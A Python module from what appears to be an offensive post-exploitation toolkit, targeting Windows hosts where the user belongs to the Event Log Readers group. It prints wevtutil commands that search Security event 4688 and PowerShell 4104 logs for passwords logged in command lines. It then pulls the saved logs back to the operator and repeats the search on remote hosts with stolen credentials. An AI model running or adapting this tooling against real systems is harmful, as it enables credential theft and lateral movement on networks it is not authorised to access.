from pathlib import Path

from modules.download.windows import receive_windows_file


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

SECURITY_QUERY = 'wevtutil qe Security /q:"*[System[(EventID=4688)]]" /rd:true /f:text'
POWERSHELL_QUERY = 'wevtutil qe "Microsoft-Windows-PowerShell/Operational" /q:"*[System[(EventID=4104)]]" /rd:true /f:text'


# ==========================================
# HELPERS
# ==========================================

def _header():

    print(f"\n{B}┌── MODULE: EVENT LOG READERS " + "─" * 30 + f"┐{W}")
    print(f"{B}│{W} TARGET: {C}{'Security / PowerShell Operational logs':<50}{W}{B}│{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt, default_yes=True, optional=False):

    #
    # Yellow [?] marks a genuinely skippable extra, not just any
    # default-to-no question — safety gates stay blue.
    #
    marker = Y if optional else B

    raw = input(f"\n{marker}[?]{W} {prompt}").strip().lower()

    if default_yes:
        return raw in ("", "y", "yes")

    return raw in ("y", "yes")


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    _header()

    _section("Execute on target")

    _step(
        1,
        "Search the Security log for command-line-logged credentials",
        "Requires Event ID 4688 process-creation auditing with command-line logging enabled — "
        "membership in Event Log Readers is enough for wevtutil.",
    )
    _cmd(
        f'{SECURITY_QUERY} | findstr /i "/user password /p: pass="',
        "# PowerShell alternative:",
        f'{SECURITY_QUERY} | Select-String "/user"',
    )

    print()
    print(f"    {B}[*]{W} Get-WinEvent needs more than this group (admin, or adjusted perms on")
    print(f"        HKLM\\System\\CurrentControlSet\\Services\\Eventlog\\Security) — wevtutil works with just this group.")

    _step(
        2,
        "Bonus: PowerShell Operational log",
        "Script block/module logging — readable by any authenticated user, no special privilege needed.",
    )
    _cmd(POWERSHELL_QUERY)

    if _ask("Save both queries to files and pull them back for offline searching? [Y/n]: "):

        _step(3, "Redirect both queries to files")
        _cmd(
            f"{SECURITY_QUERY} > security.log",
            f"{POWERSHELL_QUERY} > powershell.log",
        )

        receive_windows_file(outfile=Path("security.log"))
        receive_windows_file(outfile=Path("powershell.log"))

    if _ask("Also query a REMOTE host's Security log using known credentials? [y/N]: ", default_yes=False, optional=True):

        remote = input(f"\n{B}[?]{W} Remote hostname/IP: ").strip()
        user = input(f"{B}[?]{W} Username (DOMAIN\\user): ").strip()
        password = input(f"{B}[?]{W} Password: ").strip()

        if remote and user:

            _step(4, f"Query {remote}'s Security log remotely")
            _cmd(
                f'{SECURITY_QUERY} /r:{remote} /u:{user} /p:{password} '
                f'| findstr /i "/user password /p: pass="'
            )
